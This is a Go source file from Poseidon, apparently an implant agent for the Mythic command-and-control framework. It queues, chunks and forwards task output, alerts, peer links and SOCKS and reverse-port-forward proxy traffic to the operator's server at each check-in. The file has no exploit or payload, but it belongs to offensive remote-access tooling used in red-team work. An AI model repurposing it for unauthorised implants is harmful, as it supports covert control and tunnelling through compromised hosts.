package responses

import (
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"math"
	"sync"
	"time"
)

var (
	// mu Mutex for preventing conflicting writes to the following arrays
	mu sync.Mutex
	// TaskResponses is an array of responses for Mythic
	TaskResponses []structs.Response
	// TaskInteractiveResponses is an array of interactive messages for Mythic
	TaskInteractiveResponses []structs.InteractiveTaskMessage
	// DelegateResponses is an array of messages from delegates to go to Mythic
	DelegateResponses []structs.DelegateMessage
	// P2PConnectionMessages is an array of P2P add/remove messages for Mythic
	P2PConnectionMessages []structs.P2PConnectionMessage
	// AlertResponses is an array of alert notifications for the operator
	AlertResponses []structs.Alert
)

// channels for aggregating task responses and notifications towards Mythic
var (
	NewInteractiveTaskOutputChannel = make(chan structs.InteractiveTaskMessage, 100)
	NewAlertChannel                 = make(chan structs.Alert, 10)
	NewResponseChannel              = make(chan structs.Response, 10)
	NewDelegatesToMythicChannel     = make(chan structs.DelegateMessage, 10)
	P2PConnectionMessageChannel     = make(chan structs.P2PConnectionMessage, 10)
)
var (
	// HandleInboundMythicMessageFromEgressChannel processes messages from egress
	HandleInboundMythicMessageFromEgressChannel = make(chan structs.MythicMessageResponse, 100)
	// FromMythicSocksChannel gets SOCKS messages from Mythic
	FromMythicSocksChannel = make(chan structs.SocksMsg, 2000)
	// FromMythicRpfwdChannel gets RPFWD messages from Mythic
	FromMythicRpfwdChannel = make(chan structs.SocksMsg, 2000)
	// InterceptToMythicSocksChannel gets SOCKS messages from agent and determines if they should be held or passed to Push C2 immediately
	InterceptToMythicSocksChannel = make(chan structs.SocksMsg, 2000)
	// toMythicSocksChannel gets SOCKS messages queued up waiting for the agent to check back in with Mythic again
	toMythicSocksChannel = make(chan structs.SocksMsg, 2000)
	// InterceptToMythicRpfwdChannel gets SOCKS messages from agent and determines if they should be held or passed to Push C2 immediately
	InterceptToMythicRpfwdChannel = make(chan structs.SocksMsg, 2000)
	// toMythicRpfwdChannel gets SOCKS messages queued up waiting for the agent to check back in with Mythic again
	toMythicRpfwdChannel = make(chan structs.SocksMsg, 2000)
)

// listenForDelegateMessagesToMythic gathers the delegate messages (NewDelegatesToMythicChannel) that need to go out the egress channel into a central location
func listenForDelegateMessagesToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		response := <-NewDelegatesToMythicChannel
		pushChan := getProfilesPushChannelFunc()
		if pushChan != nil {
			pushChan <- structs.MythicMessage{
				Action:    "post_response",
				Delegates: &[]structs.DelegateMessage{response},
			}
		} else {
			mu.Lock()
			DelegateResponses = append(DelegateResponses, response)
			mu.Unlock()
		}
	}
}

// listenForEdgeAnnouncementsToMythic gather the edge notifications (P2PConnectionMessageChannel) that need to go out the egress channel
func listenForEdgeAnnouncementsToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		response := <-P2PConnectionMessageChannel
		pushChan := getProfilesPushChannelFunc()
		if pushChan != nil {
			pushChan <- structs.MythicMessage{
				Action: "post_response",
				Edges:  &[]structs.P2PConnectionMessage{response},
			}
		} else {
			mu.Lock()
			P2PConnectionMessages = append(P2PConnectionMessages, response)
			mu.Unlock()
		}
	}
}

// listenForTaskResponsesToMythic gather the responses (NewResponseChannel) from the task go routines into a central location
func listenForTaskResponsesToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		select {
		case response := <-NewResponseChannel:
			if response.Completed {
				// We need to remove this job from our list of jobs
				go func() {
					response.CompleteTask()
				}()
			}
			totalChunks := GetChunkNums(int64(len(response.UserOutput)))
			for currentChunk := int64(0); currentChunk < totalChunks; currentChunk++ {
				if currentChunk == 0 {
					newMsg := response
					nextBounds := int64(math.Min(float64(len(response.UserOutput)), USER_OUTPUT_CHUNK_SIZE))
					newMsg.UserOutput = response.UserOutput[0:nextBounds]
					emitResponse(getProfilesPushChannelFunc, newMsg)
				} else {
					newMsg := structs.Response{TaskID: response.TaskID}
					nextBounds := int64(math.Min(float64(len(response.UserOutput)), float64((currentChunk+1)*USER_OUTPUT_CHUNK_SIZE)))
					newMsg.UserOutput = response.UserOutput[currentChunk*USER_OUTPUT_CHUNK_SIZE : nextBounds]
					emitResponse(getProfilesPushChannelFunc, newMsg)
				}
			}
		}
	}
}

func emitResponse(getProfilesPushChannelFunc func() chan structs.MythicMessage, response structs.Response) {
	pushChan := getProfilesPushChannelFunc()
	if pushChan != nil {
		pushChan <- structs.MythicMessage{
			Action:    "post_response",
			Responses: &[]structs.Response{response},
		}
	} else {
		mu.Lock()
		TaskResponses = append(TaskResponses, response)
		mu.Unlock()
	}
}

// listenForInteractiveTasksToMythic gather the responses (NewInteractiveTaskOutputChannel) from the task go routines into a central location
func listenForInteractiveTasksToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		select {
		case response := <-NewInteractiveTaskOutputChannel:
			pushChan := getProfilesPushChannelFunc()
			if pushChan != nil {
				pushChan <- structs.MythicMessage{
					Action:           "post_response",
					InteractiveTasks: &[]structs.InteractiveTaskMessage{response},
				}
			} else {
				mu.Lock()
				TaskInteractiveResponses = append(TaskInteractiveResponses, response)
				mu.Unlock()
			}
		}
	}
}

// listenForAlertMessagesToMythic gather the responses (NewAlertChannel) from the task go routines into a central location
func listenForAlertMessagesToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		select {
		case response := <-NewAlertChannel:
			pushChan := getProfilesPushChannelFunc()
			if pushChan != nil {
				utils.PrintDebug("adding new alert to pushChan")
				pushChan <- structs.MythicMessage{
					Action: "post_response",
					Alerts: &[]structs.Alert{response},
				}
			} else {
				utils.PrintDebug("adding new alert to alert responses")
				mu.Lock()
				AlertResponses = append(AlertResponses, response)
				mu.Unlock()
			}
		}
	}
}

// listenForSocksTrafficToMythic gathers socks data (InterceptToMythicSocksChannel) from tasks to a central location
func listenForSocksTrafficToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		response := <-InterceptToMythicSocksChannel
		pushChan := getProfilesPushChannelFunc()
		if pushChan != nil {
			select {
			case pushChan <- structs.MythicMessage{
				Action: "post_response",
				Socks:  &[]structs.SocksMsg{response},
			}:
			case <-time.After(1 * time.Second):
				utils.PrintDebug(fmt.Sprintf("dropping push socks data because channel is full, %d", len(pushChan)))
			}

		} else {
			// if there's no push channel, forward it along like normal for somebody else to get it
			select {
			case toMythicSocksChannel <- response:
			case <-time.After(1 * time.Second):
				utils.PrintDebug(fmt.Sprintf("dropping data because channel is full, %d", len(toMythicSocksChannel)))
			}
		}
	}
}

// listenForRpfwdTrafficToMythic gathers rpfwd data (InterceptToMythicRpfwdChannel) from tasks to a central location
func listenForRpfwdTrafficToMythic(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	for {
		response := <-InterceptToMythicRpfwdChannel
		pushChan := getProfilesPushChannelFunc()
		if pushChan != nil {
			select {
			case pushChan <- structs.MythicMessage{
				Action: "post_response",
				Rpfwds: &[]structs.SocksMsg{response},
			}:
			case <-time.After(1 * time.Second):
				utils.PrintDebug(fmt.Sprintf("dropping data because channel is full"))
			}

		} else {
			// if there's no push channel, forward it along like normal for somebody else to get it
			select {
			case toMythicRpfwdChannel <- response:
			case <-time.After(1 * time.Second):
				utils.PrintDebug(fmt.Sprintf("dropping data because channel is full"))
			}

		}
	}
}

// getSocksChannelData fetches aggregated SOCKS data for Mythic based on a polling checkin
func getSocksChannelData() []structs.SocksMsg {
	var data = make([]structs.SocksMsg, 0)
	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
	for {
		select {
		case msg, ok := <-toMythicSocksChannel:
			if ok {
				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
				data = append(data, msg)
			} else {
				//fmt.Println("Channel closed!\n")
				return data
			}
		default:
			//fmt.Println("No Socks value ready, moving on.")
			return data
		}
	}
}

// getRpfwdChannelData fetches aggregated RPFWD data for Mythic based on a polling checkin
func getRpfwdChannelData() []structs.SocksMsg {
	var data = make([]structs.SocksMsg, 0)
	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
	for {
		select {
		case msg, ok := <-toMythicRpfwdChannel:
			if ok {
				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
				data = append(data, msg)
			} else {
				//fmt.Println("Channel closed!\n")
				return data
			}
		default:
			//fmt.Println("No Socks value ready, moving on.")
			return data
		}
	}
}

func CreateMythicPollMessage() *structs.MythicMessage {
	responseMsg := structs.MythicMessage{}
	responseMsg.Action = "get_tasking"
	responseMsg.TaskingSize = -1
	responseMsg.GetDelegateTasks = true
	SocksArray := getSocksChannelData()
	RpfwdArray := getRpfwdChannelData()
	if len(TaskResponses) > 0 || len(DelegateResponses) > 0 ||
		len(P2PConnectionMessages) > 0 || len(TaskInteractiveResponses) > 0 ||
		len(AlertResponses) > 0 {
		ResponseArray := make([]structs.Response, 0)
		DelegateArray := make([]structs.DelegateMessage, 0)
		P2PConnectionsArray := make([]structs.P2PConnectionMessage, 0)
		InteractiveTaskResponsesArray := make([]structs.InteractiveTaskMessage, 0)
		AlertsArray := make([]structs.Alert, 0)
		mu.Lock()
		ResponseArray = append(ResponseArray, TaskResponses...)
		DelegateArray = append(DelegateArray, DelegateResponses...)
		P2PConnectionsArray = append(P2PConnectionsArray, P2PConnectionMessages...)
		InteractiveTaskResponsesArray = append(InteractiveTaskResponsesArray, TaskInteractiveResponses...)
		AlertsArray = append(AlertsArray, AlertResponses...)
		TaskResponses = make([]structs.Response, 0)
		DelegateResponses = make([]structs.DelegateMessage, 0)
		P2PConnectionMessages = make([]structs.P2PConnectionMessage, 0)
		TaskInteractiveResponses = make([]structs.InteractiveTaskMessage, 0)
		AlertResponses = make([]structs.Alert, 0)
		mu.Unlock()
		if len(ResponseArray) > 0 {
			responseMsg.Responses = &ResponseArray
		}
		if len(DelegateArray) > 0 {
			responseMsg.Delegates = &DelegateArray
		}
		if len(P2PConnectionsArray) > 0 {
			responseMsg.Edges = &P2PConnectionsArray
		}
		if len(InteractiveTaskResponsesArray) > 0 {
			responseMsg.InteractiveTasks = &InteractiveTaskResponsesArray
		}

		if len(AlertsArray) > 0 {
			responseMsg.Alerts = &AlertsArray
		}
	}
	if len(SocksArray) > 0 {
		responseMsg.Socks = &SocksArray
	}
	if len(RpfwdArray) > 0 {
		responseMsg.Rpfwds = &RpfwdArray
	}
	return &responseMsg
}
